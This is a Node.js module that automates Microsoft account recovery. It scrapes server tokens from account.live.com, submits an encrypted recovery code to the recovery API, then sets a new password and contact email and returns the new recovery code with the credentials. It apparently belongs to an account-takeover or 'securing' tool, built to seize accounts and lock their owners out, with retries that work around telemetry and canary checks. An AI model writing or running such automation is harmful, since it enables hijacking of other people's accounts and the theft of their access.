const HttpClient = require("../process/HttpClient");
const encryptOtt2 = require("./encryptOtt2");

const RESET_PASSWORD_URL = "https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=";
const VERIFY_URL = "https://account.live.com/API/Recovery/VerifyRecoveryCode";
const RECOVER_URL = "https://account.live.com/API/Recovery/RecoverUser";
const VERIFY_PUBLIC_KEY = "08D47C476EFCAE0410F357E362C347FCA50F65EA";
const RECOVER_PUBLIC_KEY = "2CBB3761027476727BDDBC9DE02870BE01ED793A";
const MAX_RECOVER_RETRIES = 3;
const MAX_HANDSHAKE_RETRIES = 3;

function normalizeRecoveryCode(code) {
    if (!code) return null;
    const alphanumeric = code.toUpperCase().replace(/[^A-Z0-9]/g, "");
    if (alphanumeric.length !== 25) return null;
    return alphanumeric.match(/.{1,5}/g).join("-");
}

function extractServerData(html) {
    if (!html) return null;
    const match = html.match(/var\s+ServerData\s*=\s*(\{.*?\})(?:;|\s)/s);
    if (!match) return null;
    try {
        return JSON.parse(match[1]);
    } catch (error) {
        console.error("[rec-secure] Failed to parse ServerData:", error.message);
        return null;
    }
}

function extractTelemetryContext(html, fallback = null) {
    if (fallback) return fallback;
    if (!html) return null;
    const match = html.match(/"telemetryContext"\s*:\s*"([^"]+)"/);
    return match ? match[1] : null;
}

function buildHeaders(apiCanary, telemetryContext) {
    const headers = {
        "Content-type": "application/json; charset=utf-8",
        "Canary": apiCanary,
        "canary": apiCanary
    };

    if (telemetryContext) {
        headers["TelemetryContext"] = telemetryContext;
        headers["telemetrycontext"] = telemetryContext;
    }

    return headers;
}

function decodeToken(input) {
    if (!input) return null;
    try {
        return decodeURIComponent(input);
    } catch (err) {
        console.error("[rec-secure] Failed to decode token:", err.message);
        return null;
    }
}

function formatResult(email, recoveryCode, secEmail, password) {
    return {
        email2: email,
        recoveryCode,
        secEmail,
        password
    };
}

async function fetchServerContext(http, email) {
    const landing = await http.get(`${RESET_PASSWORD_URL}${encodeURIComponent(email)}`, { proxy: false });

    if (!landing?.data) {
        console.log("[rec-secure] Landing request returned no body");
        return { error: "landing" };
    }

    if (landing.data.includes("reset-password-signinname_en")) {
        console.log("[rec-secure] Invalid email indicator detected");
        return { error: "invalid-email" };
    }

    const serverData = extractServerData(landing.data);
    if (!serverData?.sRecoveryToken || !serverData?.apiCanary) {
        console.log("[rec-secure] Server data missing required fields");
        return { error: "server-data" };
    }

    const telemetryContext = extractTelemetryContext(landing.data, serverData?.telemetryContext);
    return {
        html: landing.data,
        serverData,
        telemetryContext
    };
}

module.exports = async (email, recoveryCode, secEmail, password) => {
    console.log(`[rec-secure] Recovery secure called with email=${email} recovery=${recoveryCode}`);

    const normalizedCode = normalizeRecoveryCode(recoveryCode);
    if (!normalizedCode) {
        console.log("[rec-secure] Recovery code failed normalization");
        return "invalid";
    }

    try {
        const http = new HttpClient();

        for (let contextAttempt = 0; contextAttempt < MAX_HANDSHAKE_RETRIES; contextAttempt++) {
            console.log(`[rec-secure] Context attempt ${contextAttempt + 1}/${MAX_HANDSHAKE_RETRIES}`);
            const context = await fetchServerContext(http, email);

            if (context?.error === "invalid-email") {
                return null;
            }
            if (!context || context.error) {
                continue;
            }

            const serverData = context.serverData;
            let activeTelemetry = context.telemetryContext;
            if (!activeTelemetry) {
                console.log("[rec-secure] telemetryContext missing, proceeding without it (Microsoft may reject).");
            }

            const encryptedCode = encryptOtt2(null, normalizedCode, "saproof", null);
            if (!encryptedCode) {
                console.log("[rec-secure] Failed to encrypt recovery code");
                return "invalid";
            }

            const verifyPayload = {
                publicKey: VERIFY_PUBLIC_KEY,
                recoveryCode: normalizedCode,
                code: normalizedCode,
                encryptedCode,
                scid: 100103,
                token: decodeToken(serverData.sRecoveryToken),
                telemetryContext: activeTelemetry,
                uiflvr: 1001
            };

            if (!verifyPayload.token) {
                console.log("[rec-secure] Unable to decode server recovery token");
                continue;
            }

            let verificationToken = null;
            let needNewContext = false;
            for (let verifyAttempt = 0; verifyAttempt < 3 && !verificationToken; verifyAttempt++) {
                console.log(`[rec-secure] Verify attempt ${verifyAttempt + 1}`);
                const verifyResponse = await http.post(VERIFY_URL, verifyPayload, {
                    headers: buildHeaders(serverData.apiCanary, activeTelemetry)
                });

                if (verifyResponse?.data?.token) {
                    verificationToken = decodeToken(verifyResponse.data.token);
                    if (!verificationToken) {
                        console.log("[rec-secure] Unable to decode verification token");
                        needNewContext = true;
                        break;
                    }
                    break;
                }

                const errorCode = verifyResponse?.data?.error?.code;
                const telemetry = verifyResponse?.data?.error?.telemetryContext;
                console.log(`[rec-secure] Recovery verification failed (code=${errorCode || "unknown"})`);

                if (telemetry && telemetry !== activeTelemetry) {
                    console.log("[rec-secure] Updating telemetry context from verify error response");
                    activeTelemetry = telemetry;
                    verifyPayload.telemetryContext = telemetry;
                    continue;
                }

                if (errorCode === "1247") {
                    needNewContext = true;
                    break;
                }

                return "invalid";
            }

            if (needNewContext) {
                console.log("[rec-secure] Need new context after verify failure");
                continue;
            }

            if (!verificationToken) {
                console.log("[rec-secure] Unable to obtain verification token after retries");
                continue;
            }

            let recoverRequiresContext = false;

            for (let attempt = 0; attempt <= MAX_RECOVER_RETRIES; attempt++) {
                try {
                    console.log(`[rec-secure] Recover attempt ${attempt + 1}`);
                    const recoverResponse = await http.post(RECOVER_URL,
                        {
                            contactEmail: secEmail,
                            contactEpid: "",
                            password,
                            passwordExpiryEnabled: 0,
                            publicKey: RECOVER_PUBLIC_KEY,
                            token: verificationToken,
                            telemetryContext: activeTelemetry
                        },
                        {
                            headers: buildHeaders(serverData.apiCanary, activeTelemetry)
                        }
                    );

                    if (recoverResponse?.data?.error) {
                        const errCode = recoverResponse.data.error.code;
                        const errTelemetry = recoverResponse.data.error.telemetryContext;
                        console.log(`[rec-secure] Recover API error=${errCode}`);

                        if (errTelemetry && errTelemetry !== activeTelemetry) {
                            console.log("[rec-secure] Refreshing telemetry context from recover error");
                            activeTelemetry = errTelemetry;
                            continue;
                        }

                        if (errCode === "6001") {
                            return "tfa";
                        }
                        if (errCode === "1218") {
                            return "same";
                        }
                        if (errCode === "4002" || errCode === "1247") {
                            recoverRequiresContext = true;
                            break;
                        }
                    }

                    if (recoverResponse?.data?.recoveryCode) {
                        return formatResult(email, recoverResponse.data.recoveryCode, secEmail, password);
                    }
                } catch (error) {
                    const errCode = error.response?.data?.error?.code;
                    const errTelemetry = error.response?.data?.error?.telemetryContext;
                    console.error(`[rec-secure] Recover attempt ${attempt + 1} failed`, errCode || error.message);

                    if (errTelemetry && errTelemetry !== activeTelemetry) {
                        console.log("[rec-secure] Captured telemetry context from recover exception, retrying");
                        activeTelemetry = errTelemetry;
                        continue;
                    }

                    if (errCode === "6001") {
                        return "tfa";
                    }
                    if (errCode === "1218") {
                        return "same";
                    }
                    if (errCode === "1247" || errCode === "4002") {
                        recoverRequiresContext = true;
                        break;
                    }
                    if (attempt === MAX_RECOVER_RETRIES) {
                        if (error.response?.data?.recoveryCode) {
                            return formatResult(email, error.response.data.recoveryCode, secEmail, password);
                        }
                        return "invalid";
                    }
                }
            }

            if (recoverRequiresContext) {
                console.log("[rec-secure] Recover needs new context, restarting handshake");
                continue;
            }

            console.log("[rec-secure] Exhausted recover attempts without success, restarting context");
        }
    } catch (error) {
        console.error("[rec-secure] Unexpected error:", error.message);
        return "invalid";
    }

    return "invalid";
};

